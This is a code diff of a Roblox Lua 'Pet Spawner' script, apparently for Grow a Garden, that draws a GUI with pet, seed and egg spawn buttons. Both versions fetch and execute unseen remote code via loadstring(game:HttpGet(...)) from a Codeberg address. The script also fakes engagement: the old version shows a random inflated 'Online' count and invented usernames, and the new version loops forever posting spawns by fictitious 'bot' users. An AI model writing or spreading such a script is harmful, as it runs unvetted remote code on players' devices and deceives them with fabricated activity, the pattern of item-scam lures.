@@ -1,139 +1,125 @@
-local Spawner = loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
-
 local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
 local Player = Players.LocalPlayer
 local PlayerGui = Player:WaitForChild("PlayerGui")
-local TweenService = game:GetService("TweenService")
 
--- UI Setup
+-- Load Spawner
+local Spawner = loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
+
+-- Create ScreenGui
 local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "SpawnerUI"
-ScreenGui.Parent = PlayerGui
+ScreenGui.Name = "PetSpawnerUI"
 ScreenGui.ResetOnSpawn = false
+ScreenGui.Parent = PlayerGui
 
-local Main = Instance.new("Frame")
-Main.Size = UDim2.new(0, 350, 0, 420)
-Main.Position = UDim2.new(0.5, -175, 0.5, -210)
-Main.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
-Main.BorderSizePixel = 0
-Main.Parent = ScreenGui
-Main.Active = true
-Main.Draggable = true
+-- Main Frame
+local MainFrame = Instance.new("Frame")
+MainFrame.Size = UDim2.new(0, 300, 0, 220)
+MainFrame.Position = UDim2.new(0.5, -150, 0.5, -110)
+MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+MainFrame.BorderSizePixel = 0
+MainFrame.Parent = ScreenGui
 
-local UICorner = Instance.new("UICorner", Main)
-UICorner.CornerRadius = UDim.new(0, 10)
+-- Make UI Draggable
+MainFrame.Active = true
+MainFrame.Draggable = true
 
-local function createLabel(text, parent, size, pos)
-	local lbl = Instance.new("TextLabel")
-	lbl.Text = text
-	lbl.Size = size
-	lbl.Position = pos
-	lbl.BackgroundTransparency = 1
-	lbl.TextColor3 = Color3.fromRGB(220, 220, 255)
-	lbl.Font = Enum.Font.Gotham
-	lbl.TextSize = 14
-	lbl.TextXAlignment = Enum.TextXAlignment.Left
-	lbl.Parent = parent
-	return lbl
-end
-
--- Fake Username Generator
-local function generateUsername()
-	local adjectives = {"Shy", "Fast", "Cool", "Happy", "Dark", "Chill", "Smart", "Epic"}
-	local nouns = {"Fox", "Wolf", "Raccoon", "Coder", "Scripter", "Player", "Dragon"}
-	return adjectives[math.random(#adjectives)] .. nouns[math.random(#nouns)] .. tostring(math.random(10, 99))
-end
-
--- Online Counter
-local counter = createLabel("Online: " .. math.random(10000, 20000), Main, UDim2.new(0, 160, 0, 25), UDim2.new(0, 180, 0, 10))
-counter.TextXAlignment = Enum.TextXAlignment.Right
+-- Title
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, 0, 0, 30)
+Title.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+Title.Text = "Pet Spawner"
+Title.TextColor3 = Color3.fromRGB(200, 255, 200)
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 18
+Title.Parent = MainFrame
 
 -- Inputs
-local nameBox = Instance.new("TextBox")
-nameBox.PlaceholderText = "Pet Name"
-nameBox.Size = UDim2.new(0, 320, 0, 30)
-nameBox.Position = UDim2.new(0, 15, 0, 50)
-nameBox.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
-nameBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-nameBox.Font = Enum.Font.Gotham
-nameBox.TextSize = 14
-nameBox.Parent = Main
-Instance.new("UICorner", nameBox).CornerRadius = UDim.new(0, 6)
-
-local weightBox = nameBox:Clone()
-weightBox.PlaceholderText = "Weight (kg)"
-weightBox.Position = UDim2.new(0, 15, 0, 90)
-weightBox.Text = ""
-weightBox.Parent = Main
-
-local ageBox = nameBox:Clone()
-ageBox.PlaceholderText = "Age"
-ageBox.Position = UDim2.new(0, 15, 0, 130)
-ageBox.Text = ""
-ageBox.Parent = Main
-
--- Notification
-local function createNotification(username, pet)
-	local note = Instance.new("TextLabel")
-	note.Text = username .. " spawned a " .. pet .. "!"
-	note.Size = UDim2.new(0, 300, 0, 30)
-	note.Position = UDim2.new(0.5, -150, 1, -40)
-	note.BackgroundColor3 = Color3.fromRGB(50, 50, 55)
-	note.TextColor3 = Color3.fromRGB(255, 255, 255)
-	note.Font = Enum.Font.GothamSemibold
-	note.TextSize = 14
-	note.Parent = ScreenGui
-	Instance.new("UICorner", note).CornerRadius = UDim.new(0, 8)
-	TweenService:Create(note, TweenInfo.new(0.5), {Position = UDim2.new(0.5, -150, 1, -80)}):Play()
-	task.delay(3, function()
-		TweenService:Create(note, TweenInfo.new(0.5), {Position = UDim2.new(0.5, -150, 1, 20)}):Play()
-		task.wait(0.6)
-		note:Destroy()
-	end)
+local function createInput(placeholder, pos)
+	local box = Instance.new("TextBox")
+	box.PlaceholderText = placeholder
+	box.Position = pos
+	box.Size = UDim2.new(1, -20, 0, 25)
+	box.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+	box.TextColor3 = Color3.fromRGB(255, 255, 255)
+	box.Font = Enum.Font.Gotham
+	box.TextSize = 14
+	box.Parent = MainFrame
+	return box
 end
 
+local PetNameInput = createInput("Pet Name", UDim2.new(0, 10, 0, 40))
+local KgInput = createInput("Weight (kg)", UDim2.new(0, 10, 0, 70))
+local AgeInput = createInput("Age", UDim2.new(0, 10, 0, 100))
+
 -- Buttons
-local function createButton(text, yPos)
+local function createButton(text, pos)
 	local btn = Instance.new("TextButton")
 	btn.Text = text
-	btn.Size = UDim2.new(0, 320, 0, 36)
-	btn.Position = UDim2.new(0, 15, 0, yPos)
-	btn.BackgroundColor3 = Color3.fromRGB(80, 160, 80)
+	btn.Position = pos
+	btn.Size = UDim2.new(0.5, -15, 0, 30)
+	btn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
 	btn.TextColor3 = Color3.fromRGB(255, 255, 255)
-	btn.Font = Enum.Font.GothamBold
+	btn.Font = Enum.Font.GothamSemibold
 	btn.TextSize = 14
-	btn.Parent = Main
-	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
+	btn.Parent = MainFrame
 	return btn
 end
 
--- Spawn Pet
-local spawnPetBtn = createButton("Spawn Pet", 180)
-spawnPetBtn.MouseButton1Click:Connect(function()
-	local petName = nameBox.Text ~= "" and nameBox.Text or "Unknown Pet"
-	local kg = tonumber(weightBox.Text) or 1
-	local age = tonumber(ageBox.Text) or 1
-	Spawner.SpawnPet(petName, kg, age)
-	createNotification(generateUsername(), petName)
+local SpawnBtn = createButton("Spawn Pet", UDim2.new(0, 10, 0, 130))
+local SeedBtn = createButton("Spawn Seed", UDim2.new(0.5, 5, 0, 130))
+local EggBtn = createButton("Spawn Egg", UDim2.new(0, 10, 0, 170))
+
+-- Online user counter
+local OnlineUsers = Instance.new("TextLabel")
+OnlineUsers.Size = UDim2.new(0, 100, 0, 20)
+OnlineUsers.Position = UDim2.new(1, -105, 0, 5)
+OnlineUsers.BackgroundTransparency = 1
+OnlineUsers.Text = "Online: " .. tostring(#Players:GetPlayers())
+OnlineUsers.TextColor3 = Color3.fromRGB(150, 255, 150)
+OnlineUsers.Font = Enum.Font.Gotham
+OnlineUsers.TextSize = 12
+OnlineUsers.TextXAlignment = Enum.TextXAlignment.Right
+OnlineUsers.Parent = Title
+
+-- Notification Bar
+local NotificationBar = Instance.new("TextLabel")
+NotificationBar.Size = UDim2.new(1, 0, 0, 20)
+NotificationBar.Position = UDim2.new(0, 0, 1, -20)
+NotificationBar.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+NotificationBar.TextColor3 = Color3.fromRGB(180, 255, 180)
+NotificationBar.Font = Enum.Font.Gotham
+NotificationBar.TextSize = 14
+NotificationBar.Text = ""
+NotificationBar.Parent = MainFrame
+
+-- Spawn Functions
+SpawnBtn.MouseButton1Click:Connect(function()
+	local pet = PetNameInput.Text ~= "" and PetNameInput.Text or "Raccoon"
+	local kg = tonumber(KgInput.Text) or 1
+	local age = tonumber(AgeInput.Text) or 1
+	Spawner.SpawnPet(pet, kg, age)
+	NotificationBar.Text = Player.Name .. " spawned a " .. pet .. " (" .. kg .. "kg, " .. age .. "y)"
 end)
 
--- Spawn Seed
-local spawnSeedBtn = createButton("Spawn Seed (Candy Blossom)", 230)
-spawnSeedBtn.MouseButton1Click:Connect(function()
+SeedBtn.MouseButton1Click:Connect(function()
 	Spawner.SpawnSeed("Candy Blossom")
-	createNotification(generateUsername(), "Candy Blossom Seed")
 end)
 
--- Spawn Egg
-local spawnEggBtn = createButton("Spawn Egg (Night Egg)", 280)
-spawnEggBtn.MouseButton1Click:Connect(function()
+EggBtn.MouseButton1Click:Connect(function()
 	Spawner.SpawnEgg("Night Egg")
-	createNotification(generateUsername(), "Night Egg")
 end)
 
--- Spin Plant
-local spinBtn = createButton("Spin Plant (Sunflower)", 330)
-spinBtn.MouseButton1Click:Connect(function()
-	Spawner.Spin("Sunflower")
-	createNotification(generateUsername(), "Sunflower Spin")
-end)
+-- Simulate bot activity
+local fakeUsers = {"GhostWizard2048", "GhostKid4639", "NinjaTiger4248", "EpicKid3836", "FireHunter8813", "LuckyKnight6497"}
+local pets = {"Night Fox", "Bubble Cat", "Leaf Dragon", "Mossy Pig"}
+
+while true do
+	task.wait(math.random(4, 8))
+	local bot = fakeUsers[math.random(1, #fakeUsers)]
+	local pet = pets[math.random(1, #pets)]
+	local kg = math.random(1, 5)
+	local age = math.random(1, 10)
+	NotificationBar.Text = bot .. " spawned a " .. pet .. " (" .. kg .. "kg, " .. age .. "y)"
+end
